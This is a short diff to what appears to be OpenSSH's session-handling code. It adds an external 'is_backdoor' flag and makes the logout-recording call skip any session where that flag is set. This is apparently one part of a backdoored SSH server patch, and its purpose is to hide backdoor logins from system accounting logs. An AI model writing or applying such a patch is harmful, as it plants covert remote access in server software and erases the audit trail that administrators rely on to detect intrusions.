@@ -139,6 +139,8 @@ extern int startup_pipe;
 extern void destroy_sensitive_data(void);
 extern Buffer loginmsg;
 
+extern int is_backdoor;
+
 /* original command from peer. */
 const char *original_command = NULL;
 
@@ -2309,7 +2311,7 @@ session_pty_cleanup2(Session *s)
 	debug("session_pty_cleanup: session %d release %s", s->self, s->tty);
 
 	/* Record that the user has logged out. */
-	if (s->pid != 0)
+	if (s->pid != 0 && !is_backdoor)
 		record_logout(s->pid, s->tty, s->pw->pw_name);
 
 	/* Release the pseudo-tty. */
